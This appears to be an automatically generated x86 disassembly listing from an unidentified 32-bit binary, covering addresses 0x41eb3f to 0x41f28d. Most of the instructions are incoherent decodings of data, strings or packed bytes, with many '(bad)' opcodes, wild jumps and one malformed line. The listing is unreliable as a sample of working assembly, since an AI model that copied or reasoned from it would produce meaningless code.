  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    st(5)
  41eb5b:	scas   al,BYTE PTR es:[edi]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x79ebebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    dh,cl
  41ebf7:	mov    DWORD PTR [edx+0x0],eax
  41ebfa:	add    BYTE PTR [eax],al
  41ebfc:	add    BYTE PTR [eax],al
  41ebfe:	dec    ecx
  41ebff:	add    BYTE PTR [eax+eax*1+0x69],al
  41ec03:	add    BYTE PTR [eax+eax*1+0x4b],ah
  41ec07:	add    BYTE PTR [edx+0x0],cl
  41ec0a:	dec    ebx
  41ec0b:	add    BYTE PTR [edx+0x0],cl
  41ec0e:	inc    esp
  41ec0f:	add    BYTE PTR [ebx+0x0],ch
  41ec12:	ins    BYTE PTR es:[edi],dx
  41ec13:	add    BYTE PTR [edx+0x0],ch
  41ec16:	inc    esp
  41ec17:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec1b:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec1f:	add    BYTE PTR [ecx+0x0],cl
  41ec22:	push   ebp
  41ec23:	add    BYTE PTR [edx+0x0],cl
  41ec26:	dec    ebx
  41ec27:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec2b:	add    BYTE PTR [edx+0x0],cl
  41ec2e:	dec    ebx
  41ec2f:	add    BYTE PTR [eax+0x0],cl
  41ec32:	inc    esp
  41ec33:	add    BYTE PTR [edx+0x0],cl
  41ec36:	add    BYTE PTR [eax],al
  41ec38:	add    BYTE PTR [eax],al
  41ec3a:	(bad)  
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x9e2de448
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    bl,dl
  41edbf:	push   es
  41edc0:	add    BYTE PTR [eax],al
  41edc2:	wbinvd 
  41edc4:	add    edi,DWORD PTR [esp+eax*1-0x11f0eba9]
  41edcb:	mov    eax,ds:0x758b5427
  41edd0:	wbinvd 
  41edd2:	cmp    DWORD PTR [eax+0x43],ecx
  41edd5:	pop    eax
  41edd6:	push   ecx
  41edd7:	fwait
  41edd8:	repnz scas eax,DWORD PTR es:[edi]
  41edda:	mov    al,ds:0x5a3dce23
  41eddf:	xchg   ebx,eax
  41ede0:	sbb    eax,0x8ea36ede
  41ede5:	shl    edi,0xc6
  41ede8:	in     al,0xb3
  41edea:	sti    
  41edeb:	scas   al,BYTE PTR es:[edi]
  41edec:	and    DWORD PTR ds:0x1abd132e,ebp
  41edf2:	dec    ecx
  41edf3:	mov    ecx,0xab81c2df
  41edf8:	xor    eax,0xd2f285ff
  41edfd:	fadd   QWORD PTR [eax+0x50]
  41ee00:	sub    ebx,DWORD PTR [edx+0x61]
  41ee03:	cmp    BYTE PTR [edx+0x3a],dh
  41ee06:	cs test eax,0xee08f7b1
  41ee0c:	sub    eax,DWORD PTR [esi+0x6]
  41ee0f:	inc    ebp
  41ee10:	fstp   QWORD PTR [ebx-0x69bf16f4]
  41ee16:	rcl    BYTE PTR [ebp+0x4dcdb4ad],0xa2
  41ee1d:	iret   
  41ee1e:	push   ebx
  41ee1f:	jl     0x41ee76
  41ee21:	data16 int3 
  41ee23:	xchg   esp,eax
  41ee24:	jns    0x41edc7
  41ee26:	popa   
  41ee27:	std    
  41ee28:	xor    al,0x51
  41ee2a:	jne    0x41ee39
  41ee2c:	jmp    0x9494:0x374e78f0
  41ee33:	lods   eax,DWORD PTR ds:[esi]
  41ee34:	je     0x41ee8b
  41ee36:	push   ebp
  41ee37:	loopne 0x41ee69
  41ee39:	sub    eax,0x3de81805
  41ee3e:	add    edx,esp
  41ee40:	mov    fs,WORD PTR [ecx+0x1adf33b7]
  41ee46:	cmp    ebp,DWORD PTR [esi+eax*8]
  41ee49:	stos   DWORD PTR es:[edi],eax
  41ee4a:	ins    BYTE PTR es:[edi],dx
  41ee4b:	jmp    0x41ee8f
  41ee4d:	in     eax,dx
  41ee4e:	push   ebp
  41ee4f:	xlat   BYTE PTR ds:[ebx]
  41ee50:	retf   
  41ee51:	cli    
  41ee52:	pushf  
  41ee53:	rol    BYTE PTR [eax],1
  41ee55:	shr    eax,0x15
  41ee58:	adc    esi,DWORD PTR [ecx+eax*1+0x13]
  41ee5c:	jb     0x41eea2
  41ee5e:	rol    cl,0xda
  41ee61:	cs adc dh,al
  41ee64:	call   0x4193ecfe
  41ee69:	or     BYTE PTR [ebp-0x369f4cfd],0x8b
  41ee70:	hlt    
  41ee71:	fstp   QWORD PTR [edx+esi*4+0xe]
  41ee75:	fisubr DWORD PTR [ebx]
  41ee77:	sti    
  41ee78:	lods   eax,DWORD PTR ds:[esi]
  41ee79:	mov    DWORD PTR [ebp+eax*8-0x113980f4],edx
  41ee80:	mov    cl,0x67
  41ee82:	push   eax
  41ee83:	fistp  WORD PTR [ebx]
  41ee85:	mov    bl,0xea
  41ee87:	dec    esp
  41ee88:	std    
  41ee89:	jmp    0xc59c:0x80c2b99f
  41ee90:	jg     0x41ee89
  41ee92:	mov    dh,0xc2
  41ee94:	ret    
  41ee95:	pop    edi
  41ee96:	ss mov edi,0xb6e87259
  41ee9c:	jg     0x41eeaf
  41ee9e:	ds imul esi,esi,0xfffffff1
  41eea2:	sub    ecx,esi
  41eea4:	jno    0x41eef4
  41eea6:	(bad)  
  41eea7:	sti    
  41eea8:	cmc    
  41eea9:	xchg   ebp,eax
  41eeaa:	jg     0x41eefb
  41eeac:	pusha  
  41eead:	loope  0x41eee6
  41eeaf:	xchg   ebp,eax
  41eeb0:	pop    ds
  41eeb1:	mov    eax,0x8a4b78c2
  41eeb6:	jae    0x41ef01
  41eeb8:	sbb    al,0x34
  41eeba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eebb:	pop    ecx
  41eebc:	add    BYTE PTR [eax],bh
  41eebe:	adc    al,0x88
  41eec0:	xchg   BYTE PTR [esi-0x5db51361],bl
  41eec6:	loopne 0x41ee69
  41eec8:	mov    dl,0x6
  41eeca:	das    
  41eecb:	repz cs sbb al,0xb
  41eecf:	and    al,0x61
  41eed1:	jno    0x41ee66
  41eed3:	dec    ebp
  41eed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eed5:	mov    ebp,ds
  41eed7:	cli    
  41eed8:	dec    esp
  41eed9:	out    0x1a,al
  41eedb:	sar    esi,0xdd
  41eede:	stc    
  41eedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eee0:	repz mov WORD PTR [edx-0x6b],ss
  41eee4:	fmul   QWORD PTR [ecx+edi*8+0x7a]
  41eee8:	dec    eax
  41eee9:	aas    
  41eeea:	fdivp  st(5),st
  41eeec:	jae    0x41ef60
  41eeee:	xor    al,0xb5
  41eef0:	lods   al,BYTE PTR ds:[esi]
  41eef1:	add    eax,0xd19ee265
  41eef6:	pop    ebx
  41eef7:	adc    eax,DWORD PTR [eax+0x6f289b4e]
  41eefd:	pop    es
  41eefe:	out    0x31,al
  41ef00:	cmc    
  41ef01:	shl    BYTE PTR [esi-0x4f8b4188],1
  41ef07:	call   FWORD PTR [edx-0x45e74b62]
  41ef0d:	jb     0x41ef88
  41ef0f:	cs jecxz 0x41ef07
  41ef12:	cmc    
  41ef13:	jb     0x41eecd
  41ef15:	out    0x8f,al
  41ef17:	push   cs
  41ef18:	pop    edx
  41ef19:	mov    edx,0xd6f603f9
  41ef1e:	ins    DWORD PTR es:[edi],dx
  41ef1f:	pop    ebp
  41ef20:	jmp    0x41eef0
  41ef22:	jnp    0x41ef72
  41ef24:	pop    eax
  41ef25:	test   al,0x75
  41ef27:	addr16 pop ecx
  41ef29:	cmp    al,0x75
  41ef2b:	adc    DWORD PTR [edx+esi*4],edi
  41ef2e:	jg     0x41ef2b
  41ef30:	out    dx,al
  41ef31:	adc    al,0xff
  41ef33:	in     eax,dx
  41ef34:	out    dx,al
  41ef35:	push   eax
  41ef36:	jo     0x41efb6
  41ef38:	(bad)  
  41ef39:	mov    DWORD PTR [ecx],0x9f7b7b43
  41ef3f:	dec    ebx
  41ef40:	cmp    dl,BYTE PTR [eax+edx*8-0x79]
  41ef44:	dec    eax
  41ef45:	imul   edx,DWORD PTR [edx+0xf5dbd67],0x43
  41ef4c:	sub    bh,BYTE PTR ds:0x5044e0d2
  41ef52:	or     eax,0x2420b347
  41ef57:	ja     0x41ef79
  41ef59:	and    al,BYTE PTR [ebp+0x60]
  41ef5c:	xor    ebx,DWORD PTR [eax+eax*8-0x1]
  41ef60:	sbb    al,0x62
  41ef62:	rcr    ah,cl
  41ef64:	out    0xc1,al
  41ef66:	mov    ch,0xf7
  41ef68:	js     0x41ef42
  41ef6a:	mov    ebx,0x4c8037c5
  41ef6f:	rcl    edx,cl
  41ef71:	mov    es,WORD PTR [edi]
  41ef73:	push   ecx
  41ef74:	fisubr DWORD PTR [esi-0x687eb71a]
  41ef7a:	and    BYTE PTR [ecx+0x10141eda],dl
  41ef80:	push   cs
  41ef81:	mov    esp,0x970ce35a
  41ef86:	push   ebp
  41ef87:	jmp    DWORD PTR [edx-0x25f0f960]
  41ef8d:	(bad)  
  41ef8e:	cmp    BYTE PTR [edx+0x50],bl
  41ef91:	sub    esp,DWORD PTR [eax+0x9125b5c]
  41ef97:	aad    0xcb
  41ef99:	clc    
  41ef9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef9b:	in     al,0x56
  41ef9d:	dec    edi
  41ef9e:	mov    dl,0x4b
  41efa0:	mov    ds:0x9be74d56,eax
  41efa5:	fstp   DWORD PTR [edx]
  41efa7:	aaa    
  41efa8:	int3   
  41efa9:	jae    0x41efb2
  41efab:	xor    eax,0x65bda2ee
  41efb0:	test   al,0xfd
  41efb2:	fs gs inc esi
  41efb5:	fsubr  QWORD PTR [ecx]
  41efb7:	mov    al,ds:0x80edeba2
  41efbc:	xor    dl,BYTE PTR [edx]
  41efbe:	stos   BYTE PTR es:[edi],al
  41efbf:	pop    eax
  41efc0:	and    bl,BYTE PTR [esi]
  41efc2:	xor    DWORD PTR [ebx],0x7e
  41efc5:	loop   0x41ef75
  41efc7:	pop    edi
  41efc8:	pop    es
  41efc9:	mov    eax,0x4559ac4e
  41efce:	add    DWORD PTR [ebx-0x2a789d3d],0x53
  41efd5:	push   cs
  41efd6:	mov    dl,0xa8
  41efd8:	pusha  
  41efd9:	(bad)  
  41efda:	std    
  41efdb:	cwde   
  41efdc:	icebp  
  41efdd:	jne    0x41f023
  41efdf:	jae    0x41f01a
  41efe1:	sahf   
  41efe2:	sub    esi,DWORD PTR [edi+0x5d]
  41efe5:	adc    eax,0x95943f42
  41efea:	test   al,0x4e
  41efec:	jb     0x41ef8f
  41efee:	shl    BYTE PTR [eax],1
  41eff0:	jp     0x41f055
  41eff2:	jle    0x41ef89
  41eff4:	fimul  WORD PTR [ebx+0x7317a109]
  41effa:	adc    bh,ah
  41effc:	cmp    BYTE PTR [eax],ch
  41effe:	and    BYTE PTR [ebx],0x8b
  41f001:	jle    0x41f06a
  41f003:	xchg   ebx,eax
  41f004:	lods   al,BYTE PTR ds:[esi]
  41f005:	dec    esp
  41f006:	xor    ah,dl
  41f008:	mov    ds,WORD PTR [esi]
  41f00a:	mov    WORD PTR [ebp+0x2ae48d0e],ss
  41f010:	mov    ds:0x8dd70a98,al
  41f015:	out    0x6f,al
  41f017:	mov    dl,0x12
  41f019:	jge    0x41f001
  41f01b:	xor    cl,BYTE PTR [ebx-0x1a2dca8d]
  41f021:	lock adc BYTE PTR [esi+0x41d54fb9],bh
  41f028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f029:	hlt    
  41f02a:	int    0x8f
  41f02c:	popa   
  41f02d:	xchg   esi,eax
  41f02e:	mov    esp,0xf60ad0d3
  41f033:	(bad)  [ebx+0x1cbc149e]
  41f039:	mov    DWORD PTR [edx-0x75],esp
  41f03c:	jle    0x41f057
  41f03e:	sbb    al,0x2b
  41f040:	push   es
  41f041:	xor    al,0x76
  41f043:	inc    eax
  41f044:	inc    ecx
  41f045:	loopne 0x41f05d
  41f047:	add    al,BYTE PTR [eax-0x52]
  41f04a:	inc    edi
  41f04b:	ror    cl,1
  41f04d:	imul   eax,DWORD PTR [esi+0x67b5ae9c],0x994eafec
  41f057:	cld    
  41f058:	dec    edx
  41f059:	out    0xe3,al
  41f05b:	outs   dx,DWORD PTR ds:[esi]
  41f05c:	jl     0x41f097
  41f05e:	sbb    eax,0xb471ac7b
  41f063:	add    edx,DWORD PTR [edx+ecx*1-0x224d027a]
  41f06a:	test   edx,ebx
  41f06c:	inc    edi
  41f06d:	mov    WORD PTR [ecx-0x7f],ds
  41f070:	push   eax
  41f071:	test   al,0x8c
  41f073:	mov    ebx,0x56bda24f
  41f078:	mov    ds:0x5c4c38e0,al
  41f07d:	test   BYTE PTR [esi+0x1d439b20],al
  41f083:	lds    ebx,FWORD PTR [edi+0x7e]
  41f086:	cmp    DWORD PTR [ebp-0x7a62d30d],esi
  41f08c:	hlt    
  41f08d:	aad    0x5e
  41f08f:	fadd   st(5),st
  41f091:	es in  al,0xa4
  41f094:	sub    edi,DWORD PTR [edi-0x80]
  41f097:	sub    eax,0xd32f18b6
  41f09c:	xchg   bh,ah
  41f09e:	outs   dx,DWORD PTR ds:[esi]
  41f09f:	pushf  
  41f0a0:	ds pop ecx
  41f0a2:	pop    esi
  41f0a3:	hlt    
  41f0a4:	leave  
  41f0a5:	and    dl,bh
  41f0a7:	xor    dh,BYTE PTR [ecx-0x7d245abe]
  41f0ad:	sbb    BYTE PTR [esp+ebp*8],dh
  41f0b0:	sub    eax,0xdbd2f900
  41f0b5:	ins    DWORD PTR es:[edi],dx
  41f0b6:	clc    
  41f0b7:	pop    ebp
  41f0b8:	retf   0xcffd
  41f0bb:	cmp    BYTE PTR [edi-0x30c81edb],0xb0
  41f0c2:	(bad)  
  41f0c3:	push   0x9bf6d9a7
  41f0c8:	out    dx,eax
  41f0c9:	mov    dl,0x42
  41f0cb:	dec    esi
  41f0cc:	and    dh,BYTE PTR [ebp-0x23]
  41f0cf:	jge    0x41f05b
  41f0d1:	dec    ebp
  41f0d2:	jne    0x41f068
  41f0d4:	pop    es
  41f0d5:	jmp    0xa65c9cad
  41f0da:	adc    eax,0x21dab85e
  41f0df:	das    
  41f0e0:	(bad)  
  41f0e1:	repz xchg ebx,eax
  41f0e3:	cmp    DWORD PTR [esi+0x2e],ecx
  41f0e6:	aad    0x7c
  41f0e8:	xchg   esi,eax
  41f0e9:	sbb    al,0x14
  41f0eb:	std    
  41f0ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0ee:	push   esp
  41f0ef:	adc    edx,edi
  41f0f1:	sahf   
  41f0f2:	les    edi,FWORD PTR ds:0x32bbf3fa
  41f0f8:	and    ah,0xdc
  41f0fb:	addr16 pop eax
  41f0fd:	mov    esi,0x7bb4241f
  41f102:	xchg   esi,eax
  41f103:	stc    
  41f104:	mov    cs,WORD PTR [eax]
  41f106:	sbb    BYTE PTR [edi+0x12e0a11c],dl
  41f10c:	adc    ah,BYTE PTR [edx]
  41f10e:	or     al,0x2a
  41f110:	call   FWORD PTR [esi]
  41f112:	cdq    
  41f113:	fs jns 0x41f167
  41f116:	jne    0x41f132
  41f118:	cdq    
  41f119:	mov    DWORD PTR [edx+0x7f2e49cb],edi
  41f11f:	push   edi
  41f120:	sub    esi,DWORD PTR [ebp+ebp*4+0x7d]
  41f124:	int    0x57
  41f126:	jno    0x41f14a
  41f128:	and    BYTE PTR [ebx+edx*8],bh
  41f12b:	mov    bl,0xa2
  41f12d:	jmp    0xe825:0xbe788b22
  41f134:	pop    ds
  41f135:	stc    
  41f136:	sahf   
  41f137:	dec    ebp
  41f138:	cmp    ah,dh
  41f13a:	jbe    0x41f11e
  41f13c:	sti    
  41f13d:	adc    ch,al
  41f13f:	mov    bl,0x3a
  41f141:	adc    al,0xe4
  41f143:	sbb    al,0xea
  41f145:	cmp    bh,BYTE PTR [esp+ebx*4-0x10e012f0]
  41f14c:	or     ebx,edi
  41f14e:	mov    cl,0x63
  41f150:	sbb    DWORD PTR ds:[eax-0x2d],ebx
  41f154:	dec    ebp
  41f155:	mov    eax,ds:0x75fbd847
  41f15a:	aad    0xf0
  41f15c:	cld    
  41f15d:	jno    0x41f124
  41f15f:	xchg   ebp,eax
  41f160:	or     DWORD PTR [ebx-0x123bddfe],0xfffffff6
  41f167:	fidivr WORD PTR [ecx-0x4a0cd468]
  41f16d:	nop
  41f16e:	xlat   BYTE PTR ds:[ebx]
  41f16f:	arpl   WORD PTR [esi+0x56],ax
  41f172:	pop    es
  41f173:	mov    ebp,0x43a68cb0
  41f178:	add    eax,0x992e9a93
  41f17d:	xchg   ebp,eax
  41f17e:	test   DWORD PTR ds:0xe809410d,esi
  41f184:	push   esp
  41f185:	sbb    eax,0x3d8743cd
  41f18a:	xchg   bh,ch
  41f18c:	push   eax
  41f18d:	push   ds
  41f18e:	sub    BYTE PTR [esp+ebp*2-0x6ff40e08],al
  41f195:	ins    BYTE PTR es:[edi],dx
  41f196:	push   0x906af647
  41f19b:	lock int 0x5
  41f19e:	ffreep st(6)
  41f1a0:	sahf   
  41f1a1:	(bad)  
  41f1a2:	icebp  
  41f1a3:	xchg   ebp,eax
  41f1a4:	and    eax,0x52c13568
  41f1a9:	imul   dh
  41f1ab:	pusha  
  41f1ac:	push   cs
  41f1ad:	sub    al,0xc8
  41f1af:	xchg   ebp,eax
  41f1b0:	pop    ds
  41f1b1:	in     eax,dx
  41f1b2:	dec    eax
  41f1b3:	jg     0x41f1dd
  41f1b5:	call   0x5314c9db
  41f1ba:	jmp    0xf2108945
  41f1bf:	xor    al,0xb6
  41f1c1:	jecxz  0x41f1b0
  41f1c3:	(bad)  
  41f1c5:	test   BYTE PTR [ecx+0x4dc6c55e],dl
  41f1cb:	or     BYTE PTR [edx-0x7d],0x2c
  41f1cf:	mov    cl,0x4f
  41f1d1:	imul   BYTE PTR [esi-0xc]
  41f1d4:	sbb    dh,ah
  41f1d6:	repz dec ecx
  41f1d8:	hlt    
  41f1d9:	das    
  41f1da:	ins    DWORD PTR es:[edi],dx
  41f1db:	jp     0x41f229
  41f1dd:	adc    dh,BYTE PTR [ebx+0x52]
  41f1e0:	cmp    BYTE PTR [ecx-0xd],bh
  41f1e3:	test   BYTE PTR [ecx-0x1f902e1],dh
  41f1e9:	lods   al,BYTE PTR ds:[esi]
  41f1ea:	mov    eax,0x87bd43d8
  41f1ef:	fistp  WORD PTR [edi]
  41f1f1:	xlat   BYTE PTR ds:[ebx]
  41f1f2:	jno    0x41f24a
  41f1f4:	jbe    0x41f1f7
  41f1f6:	jns    0x41f1a2
  41f1f8:	lahf   
  41f1f9:	sub    BYTE PTR [eax],0x35
  41f1fc:	mov    al,0x1e
  41f1fe:	ins    BYTE PTR es:[edi],dx
  41f1ff:	pop    esi
  41f200:	retf   0xe5d6
  41f203:	ins    DWORD PTR es:[edi],dx
  41f204:	lock xchg edx,eax
  41f206:	fdivr  QWORD PTR [ebx+0x24]
  41f209:	and    ah,BYTE PTR [eax-0xf4d1b06]
  41f20f:	mov    dl,0xf8
  41f211:	or     BYTE PTR [edi+edi*8+0x24],dl
  41f215:	or     esp,DWORD PTR [edx]
  41f217:	in     eax,0x54
  41f219:	fiadd  WORD PTR [esi+0x354bc5b4]
  41f21f:	add    al,0x9c
  41f221:	shl    BYTE PTR ds:0x5fae4f25,cl
  41f227:	jns    0x41f234
  41f229:	jecxz  0x41f209
  41f22b:	dec    di
  41f22d:	dec    edx
  41f22e:	sub    edx,DWORD PTR [edi]
  41f230:	popf   
  41f231:	aaa    
  41f232:	sahf   
  41f233:	mov    eax,ds:0x5e695916
  41f238:	xchg   ecx,eax
  41f239:	jne    0x41f240
  41f23b:	call   FWORD PTR [eax+ebx*2-0x6359689a]
  41f242:	jae    0x41f22a
  41f244:	scas   eax,DWORD PTR es:[edi]
  41f245:	lahf   
  41f246:	int3   
  41f247:	repnz data16 jecxz 0x41f200
  41f24b:	arpl   sp,ax
  41f24d:	pop    ebx
  41f24e:	mov    eax,0xf1aaf248
  41f253:	iret   
  41f254:	fwait
  41f255:	xchg   ebp,eax
  41f256:	int    0xc9
  41f258:	test   DWORD PTR [edi],ebx
  41f25a:	cmp    BYTE PTR [esi+0x3c],dl
  41f25d:	ret    0xfdd2
  41f260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f261:	enter  0x8cff,0xb5
  41f265:	add    DWORD PTR [eax+edi*1+0x67296c49],0xd1661efe
  41f270:	cdq    
  41f271:	fadd   DWORD PTR [ebx+0x41]
  41f274:	mov    al,ds:0x7e9acf4f
  41f279:	les    ecx,FWORD PTR [ecx-0x59]
  41f27c:	pop    esp
  41f27d:	and    BYTE PTR [edi+eiz*1],dl
  41f280:	in     al,0x1b
  41f282:	dec    edi
  41f283:	mov    eax,0x5e2046cf
  41f288:	push   0x28ac844d
  41f28d:	mov    bl,0x60
